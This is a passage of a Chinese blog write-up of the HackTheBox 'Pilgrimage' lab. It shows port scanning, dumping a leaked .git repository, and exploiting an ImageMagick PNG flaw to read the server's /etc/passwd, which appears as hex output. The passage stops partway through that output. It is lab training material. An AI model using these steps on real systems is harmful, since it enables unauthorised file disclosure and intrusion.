@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Pilgrimage | Someb0dy&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="CVE-2022-44628,CVE-2022-4510">
+    <meta name="description" content="2023年6月25日 19:51:38  UserNmap┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools] └─# nmap -p- --min-rate 10000 10.10.11.219                                                                        130 ⨯ Starti">
+<meta name="keywords" content="CVE-2022-44628,CVE-2022-4510">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pilgrimage">
+<meta property="og:url" content="someb0dy.github.io/2023/06/26/Pilgrimage/index.html">
+<meta property="og:site_name" content="Someb0dy&#39;s blog">
+<meta property="og:description" content="2023年6月25日 19:51:38  UserNmap┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools] └─# nmap -p- --min-rate 10000 10.10.11.219                                                                        130 ⨯ Starti">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687694117241-8ec9fb93-fba9-4782-9d8f-a5bdb7fe58fb.png#averageHue=%233f505d&clientId=uf273fc15-75b9-4&from=paste&height=592&id=u1de3683b&originHeight=740&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108169&status=done&style=none&taskId=u8dd10869-ed1b-408f-87d1-1a3d6bae5d4&title=&width=1535.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687694226729-5d4d8831-ce66-42a2-b4de-350331140281.png#averageHue=%2320585d&clientId=uf273fc15-75b9-4&from=paste&height=647&id=u1035c226&originHeight=809&originWidth=1906&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80066&status=done&style=none&taskId=u4086a9f5-bd0c-4a57-9377-bed4d51486c&title=&width=1524.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687695343185-9bc4b296-11bc-41a1-bb94-2883c7ca3f6f.png#averageHue=%230e0e0e&clientId=uf273fc15-75b9-4&from=paste&height=546&id=u3abcbc01&originHeight=682&originWidth=1316&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=85796&status=done&style=none&taskId=ua9e3d443-dc63-44c6-bd36-88e26c544f5&title=&width=1052.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687701284715-69d828af-2f5b-4153-9185-872ec91c666d.png#averageHue=%23171717&clientId=uf273fc15-75b9-4&from=paste&height=464&id=u0f155578&originHeight=580&originWidth=1447&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79939&status=done&style=none&taskId=ub0f3eb53-7aa7-4c56-a53c-7ec142734cd&title=&width=1157.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687701315485-7d7583fb-9d68-4df7-9a95-c343866411ee.png#averageHue=%23fefdfd&clientId=uf273fc15-75b9-4&from=paste&height=319&id=uc6782776&originHeight=399&originWidth=1160&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49938&status=done&style=none&taskId=u04bb4381-4bce-4f7b-9894-79d10a62f15&title=&width=928">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687702643589-fbcfae9d-c635-4b80-ab7f-dfbc43c839ae.png#averageHue=%23191919&clientId=uf273fc15-75b9-4&from=paste&height=370&id=u8478037c&originHeight=463&originWidth=1182&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63393&status=done&style=none&taskId=udc049e1e-0b55-4c76-af08-67c357aee3f&title=&width=945.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687703141520-a11c7adb-f593-4cd0-9827-e5f6dc0425a4.png#averageHue=%23c4a885&clientId=uf273fc15-75b9-4&from=paste&height=462&id=u094758f2&originHeight=578&originWidth=1409&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=188285&status=done&style=none&taskId=ue36c4039-01e0-45d3-81e6-afd442625da&title=&width=1127.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687703022871-7c9b3485-cad9-4397-8ea1-c32de307bc6d.png#averageHue=%232b2713&clientId=uf273fc15-75b9-4&from=paste&height=596&id=u8bdfccbd&originHeight=745&originWidth=1900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179498&status=done&style=none&taskId=uda42b6b6-05f5-4620-9912-5117f9f63df&title=&width=1520">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687703364663-e6230415-bbf5-4596-88c0-96bc212fde87.png#averageHue=%231b384c&clientId=uf273fc15-75b9-4&from=paste&height=140&id=u65bba558&originHeight=175&originWidth=679&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39449&status=done&style=none&taskId=uc341ccb9-d6dc-4902-8209-8f9d8445732&title=&width=543.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687704565931-f05f1f14-28d0-49f4-99e0-ac83261803d0.png#averageHue=%2313293b&clientId=uf273fc15-75b9-4&from=paste&height=250&id=ufc0f2e4a&originHeight=312&originWidth=714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17660&status=done&style=none&taskId=uc4dbdeb1-b330-42b6-b106-77759581635&title=&width=571.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687704684814-e0d973d8-1055-4644-a0dd-49d04e97727c.png#averageHue=%23191919&clientId=uf273fc15-75b9-4&from=paste&height=362&id=u45ccd8e1&originHeight=452&originWidth=1331&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66039&status=done&style=none&taskId=u89ef4f1d-c526-4559-add4-e703d1aa0da&title=&width=1064.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687705021072-b3d51a98-401e-46a6-be0f-6778a5c70cdb.png#averageHue=%23101010&clientId=uf273fc15-75b9-4&from=paste&height=372&id=u9a4762c1&originHeight=465&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123703&status=done&style=none&taskId=u65b90055-e96a-4052-8fa9-f3a1eea414e&title=&width=1524">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687707728069-c0bfb81a-338c-4209-bee2-75bebe664ee0.png#averageHue=%23fefdfc&clientId=uf273fc15-75b9-4&from=paste&height=570&id=ud01891d5&originHeight=713&originWidth=1415&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106031&status=done&style=none&taskId=u6d660ed7-b001-47ea-8760-21dad24dc6b&title=&width=1132">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687708443477-49489558-144e-479d-9807-f6e367dd6e66.png#averageHue=%23f4f0ec&clientId=uf273fc15-75b9-4&from=paste&height=376&id=ue7fa6749&originHeight=470&originWidth=907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53499&status=done&style=none&taskId=u99966bd7-220f-46eb-9c82-842ca185360&title=&width=725.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687708460075-4edf75dd-3e7f-4d98-b6bd-a35589b71e67.png#averageHue=%23151515&clientId=uf273fc15-75b9-4&from=paste&height=616&id=u630e26d8&originHeight=770&originWidth=1615&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98615&status=done&style=none&taskId=u6dae4bc7-b1ff-4eba-b44e-fd78630f53a&title=&width=1292">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687708600428-8a9a6edb-a07f-4893-a5bb-0e639623020c.png#averageHue=%23121212&clientId=uf273fc15-75b9-4&from=paste&height=413&id=u1f4598f8&originHeight=516&originWidth=1402&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61202&status=done&style=none&taskId=u8b0fefe6-3a0a-4206-b9d8-0715cc6a99e&title=&width=1121.6">
+<meta property="og:updated_time" content="2023-06-25T16:04:30.853Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687694117241-8ec9fb93-fba9-4782-9d8f-a5bdb7fe58fb.png#averageHue=%233f505d&clientId=uf273fc15-75b9-4&from=paste&height=592&id=u1de3683b&originHeight=740&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108169&status=done&style=none&taskId=u8dd10869-ed1b-408f-87d1-1a3d6bae5d4&title=&width=1535.2">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Someb0dy</h5>
+          <a href="mailto:1362460837@qq.com" target="_blank" rel="noopener" title="1362460837@qq.com" class="mail">1362460837@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Giraffe711" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Pilgrimage</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Pilgrimage</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-06-25T16:02:30.834Z" itemprop="datePublished" class="page-time">
+  2023-06-26
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#User"><span class="post-toc-number">1.</span> <span class="post-toc-text">User</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dirsearch"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">dirsearch</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#git-泄露"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">git 泄露</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CVE-2022-44628"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">CVE-2022-44628</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#x2F-var-x2F-db-x2F-pilgrimage"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">/var/db/pilgrimage</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root"><span class="post-toc-number">2.</span> <span class="post-toc-text">root</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CVE-2022-4510：Binwalk-远程代码执行漏洞"><span class="post-toc-number">3.</span> <span class="post-toc-text">CVE-2022-4510：Binwalk 远程代码执行漏洞</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">4.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Pilgrimage"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Pilgrimage</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-06-26 00:02:30" datetime="2023-06-25T16:02:30.834Z"  itemprop="datePublished">2023-06-26</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <pre><code class="bash">2023年6月25日 19:51:38
+</code></pre>
+<h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools]
+└─# nmap -p- --min-rate 10000 10.10.11.219                                                                        130 ⨯
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 07:51 EDT
+Nmap scan report for 10.10.11.219
+Host is up (0.11s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 10.45 seconds
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools]
+└─# nmap -p22,80 -sCV --min-rate 10000 10.10.11.219
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 07:52 EDT
+Nmap scan report for 10.10.11.219
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
+|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
+|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://pilgrimage.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
+</code></pre>
+<p>22,80 经典开局两端口</p>
+<pre><code class="bash">echo &quot;10.10.11.219 pilgrimage.htb&quot; &gt;&gt;/etc/hosts 
+</code></pre>
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687694117241-8ec9fb93-fba9-4782-9d8f-a5bdb7fe58fb.png#averageHue=%233f505d&clientId=uf273fc15-75b9-4&from=paste&height=592&id=u1de3683b&originHeight=740&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108169&status=done&style=none&taskId=u8dd10869-ed1b-408f-87d1-1a3d6bae5d4&title=&width=1535.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这里有一个缩小文件空间的上传点</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687694226729-5d4d8831-ce66-42a2-b4de-350331140281.png#averageHue=%2320585d&clientId=uf273fc15-75b9-4&from=paste&height=647&id=u1035c226&originHeight=809&originWidth=1906&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80066&status=done&style=none&taskId=u4086a9f5-bd0c-4a57-9377-bed4d51486c&title=&width=1524.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687695343185-9bc4b296-11bc-41a1-bb94-2883c7ca3f6f.png#averageHue=%230e0e0e&clientId=uf273fc15-75b9-4&from=paste&height=546&id=u3abcbc01&originHeight=682&originWidth=1316&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=85796&status=done&style=none&taskId=ua9e3d443-dc63-44c6-bd36-88e26c544f5&title=&width=1052.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="git-泄露"><a href="#git-泄露" class="headerlink" title="git 泄露"></a>git 泄露</h2><p>通过Githack 把源码下载来下<br>Repository:<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p>
+<pre><code class="bash">┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Pilgrimage/Githack]
+└─# python3 GitHack.py http://pilgrimage.htb/.git                                                                 255 ⨯
+[+] Download and parse index file ...
+[+] assets/bulletproof.php
+[+] assets/css/animate.css
+[+] assets/css/custom.css
+[+] assets/css/flex-slider.css
+[+] assets/css/fontawesome.css
+[+] assets/css/owl.css
+[+] assets/css/templatemo-woox-travel.css
+[+] assets/images/banner-04.jpg
+[+] assets/images/cta-bg.jpg
+[+] assets/js/custom.js
+[+] assets/js/isotope.js
+[+] assets/js/isotope.min.js
+[+] assets/js/owl-carousel.js
+[+] assets/js/popup.js
+[+] assets/js/tabs.js
+[+] assets/webfonts/fa-brands-400.ttf
+[+] assets/webfonts/fa-brands-400.woff2
+[+] assets/webfonts/fa-regular-400.ttf
+[+] assets/webfonts/fa-regular-400.woff2
+[+] assets/webfonts/fa-solid-900.ttf
+[+] assets/webfonts/fa-solid-900.woff2
+[+] assets/webfonts/fa-v4compatibility.ttf
+[+] assets/webfonts/fa-v4compatibility.woff2
+[+] dashboard.php
+[+] index.php
+[+] login.php
+[+] logout.php
+[+] magick
+[+] register.php
+[+] vendor/bootstrap/css/bootstrap.min.css
+[+] vendor/bootstrap/js/bootstrap.min.js
+[+] vendor/jquery/jquery.js
+[+] vendor/jquery/jquery.min.js
+[+] vendor/jquery/jquery.min.map
+[+] vendor/jquery/jquery.slim.js
+[+] vendor/jquery/jquery.slim.min.js
+[+] vendor/jquery/jquery.slim.min.map
+[OK] assets/bulletproof.php
+[OK] assets/css/custom.css
+[Error] [Errno 17] File exists: &#39;pilgrimage.htb/assets/css&#39;
+[Error] [Errno 17] File exists: &#39;pilgrimage.htb/assets/css&#39;
+[OK] assets/css/owl.css
+[OK] assets/js/custom.js
+[OK] assets/css/templatemo-woox-travel.css
+[OK] assets/css/fontawesome.css
+[OK] assets/images/cta-bg.jpg
+[OK] assets/js/isotope.js
+[OK] assets/css/flex-slider.css
+[OK] assets/css/animate.css
+[OK] assets/js/popup.js
+[OK] assets/js/owl-carousel.js
+[OK] assets/js/isotope.min.js
+[OK] assets/images/banner-04.jpg
+[OK] assets/webfonts/fa-regular-400.woff2
+[OK] assets/webfonts/fa-regular-400.ttf
+[OK] assets/webfonts/fa-v4compatibility.ttf
+[OK] assets/js/tabs.js
+[OK] assets/webfonts/fa-brands-400.ttf
+[OK] assets/webfonts/fa-v4compatibility.woff2
+[OK] assets/webfonts/fa-brands-400.woff2
+[OK] dashboard.php
+[OK] index.php
+[OK] logout.php
+[OK] login.php
+[OK] assets/webfonts/fa-solid-900.ttf
+[OK] assets/webfonts/fa-solid-900.woff2
+[OK] register.php
+[OK] vendor/bootstrap/js/bootstrap.min.js
+[OK] vendor/bootstrap/css/bootstrap.min.css
+[OK] vendor/jquery/jquery.min.js
+[OK] vendor/jquery/jquery.slim.min.js
+[OK] vendor/jquery/jquery.slim.js
+[OK] vendor/jquery/jquery.min.map
+[OK] vendor/jquery/jquery.js
+[OK] vendor/jquery/jquery.slim.min.map
+[OK] magick
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Pilgrimage/Githack]
+└─# ls
+GitHack.py  index  lib  lib.zip  pilgrimage.htb
+</code></pre>
+<p>通过.git泄露出网站源代码后我们经过简单的审计<br>exec 命令执行没戏，<br>文件上传没戏，<br>sql注入没戏,<br>好像无路可走了<br>但是这源代码中还有一个magick 二进制文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687701284715-69d828af-2f5b-4153-9185-872ec91c666d.png#averageHue=%23171717&clientId=uf273fc15-75b9-4&from=paste&height=464&id=u0f155578&originHeight=580&originWidth=1447&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79939&status=done&style=none&taskId=ub0f3eb53-7aa7-4c56-a53c-7ec142734cd&title=&width=1157.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>Google一下!!!</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687701315485-7d7583fb-9d68-4df7-9a95-c343866411ee.png#averageHue=%23fefdfd&clientId=uf273fc15-75b9-4&from=paste&height=319&id=uc6782776&originHeight=399&originWidth=1160&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49938&status=done&style=none&taskId=u04bb4381-4bce-4f7b-9894-79d10a62f15&title=&width=928" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="CVE-2022-44628"><a href="#CVE-2022-44628" class="headerlink" title="CVE-2022-44628"></a>CVE-2022-44628</h2><p><a href="https://xz.aliyun.com/t/12133" target="_blank" rel="noopener">https://xz.aliyun.com/t/12133</a></p>
+<ul>
+<li>CVE-2022-44268：ImageMagick 7.1.0-49 存在信息泄露漏洞。当它解析 PNG 图像（例如，用于调整大小）时，生成的图像中可能会嵌入任意本地文件的内容（如果 ImageMagick 二进制文件有读取权限）。</li>
+</ul>
+<p> POC:<a href="https://github.com/voidz0r/CVE-2022-44268" target="_blank" rel="noopener">https://github.com/voidz0r/CVE-2022-44268</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687702643589-fbcfae9d-c635-4b80-ab7f-dfbc43c839ae.png#averageHue=%23191919&clientId=uf273fc15-75b9-4&from=paste&height=370&id=u8478037c&originHeight=463&originWidth=1182&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63393&status=done&style=none&taskId=udc049e1e-0b55-4c76-af08-67c357aee3f&title=&width=945.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>执行之后当前目录下生成了一个image.png<br>我们尝试上传</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687703141520-a11c7adb-f593-4cd0-9827-e5f6dc0425a4.png#averageHue=%23c4a885&clientId=uf273fc15-75b9-4&from=paste&height=462&id=u094758f2&originHeight=578&originWidth=1409&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=188285&status=done&style=none&taskId=ue36c4039-01e0-45d3-81e6-afd442625da&title=&width=1127.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>使用curl 保存到本地</p>
+<pre><code class="bash">curl http://pilgrimage.htb/shrunk/64984cf2658a8.png -o out.png
+</code></pre>
+<p>再使用identify 来看图片详细数据</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/…/machine/Pilgrimage/CVE-2022-44628/CVE-2022-44268]
+└─# identify -verbose out.png
+Image:
+  Filename: out.png
+  Format: PNG (Portable Network Graphics)
+  Mime type: image/png
+  Class: PseudoClass
+  Geometry: 100x100+0+0
+  Units: Undefined
+  Colorspace: sRGB
+  Type: Palette
+  Base type: Undefined
+  Endianness: Undefined
+  Depth: 8/1-bit
+  Channel depth:
+    red: 1-bit
+    green: 1-bit
+    blue: 1-bit
+  Channel statistics:
+    Pixels: 10000
+    Red:
+      min: 255  (1)
+      max: 255 (1)
+      mean: 255 (1)
+      standard deviation: 0 (0)
+      kurtosis: 8.192e+51
+      skewness: 1e+36
+      entropy: 0
+    Green:
+      min: 0  (0)
+      max: 0 (0)
+      mean: 0 (0)
+      standard deviation: 0 (0)
+      kurtosis: -3
+      skewness: 0
+      entropy: 0
+    Blue:
+      min: 0  (0)
+      max: 0 (0)
+      mean: 0 (0)
+      standard deviation: 0 (0)
+      kurtosis: -3
+      skewness: 0
+      entropy: 0
+  Image statistics:
+    Overall:
+      min: 0  (0)
+      max: 255 (1)
+      mean: 85 (0.333333)
+      standard deviation: 0 (0)
+      kurtosis: -1.5001
+      skewness: 0.707071
+      entropy: 0
+  Colors: 1
+  Histogram:
+    10000: (255,0,0) #FF0000 red
+  Colormap entries: 2
+  Colormap:
+    0: (255,0,0) #FF0000 red
+    1: (255,255,255) #FFFFFF white
+  Rendering intent: Perceptual
+  Gamma: 0.45455
+  Chromaticity:
+    red primary: (0.64,0.33)
+    green primary: (0.3,0.6)
+    blue primary: (0.15,0.06)
+    white point: (0.3127,0.329)
+  Background color: srgb(99.6124%,99.6124%,99.6124%)
+  Border color: srgb(223,223,223)
+  Matte color: grey74
+  Transparent color: black
+  Interlace: None
+  Intensity: Undefined
+  Compose: Over
+  Page geometry: 100x100+0+0
+  Dispose: Undefined
+  Iterations: 0
+  Compression: Zip
+  Orientation: Undefined
+  Properties:
+    date:create: 2023-06-25T14:20:40+00:00
+    date:modify: 2023-06-25T14:20:40+00:00
+    date:timestamp: 2023-06-25T14:19:30+00:00
+    png:bKGD: chunk was found (see Background color, above)
+    png:cHRM: chunk was found (see Chromaticity, above)
+    png:gAMA: gamma=0.45455 (See Gamma, above)
+    png:IHDR.bit-depth-orig: 1
+    png:IHDR.bit_depth: 1
+    png:IHDR.color-type-orig: 3
+    png:IHDR.color_type: 3 (Indexed)
+    png:IHDR.interlace_method: 0 (Not interlaced)
+    png:IHDR.width,height: 100, 100
+    png:PLTE.number_colors: 2
+    png:sRGB: intent=0 (Perceptual Intent)
+    png:text: 4 tEXt/zTXt/iTXt chunks were found
+    png:tIME: 2023-06-25T14:19:30Z
+    Raw profile type:
+
+    1437
+726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
+6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
+6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
+2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
+6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
+62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
+65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
+2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
+783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
+6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
+2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
+706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
+303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
+6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
+722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
+646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
+75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
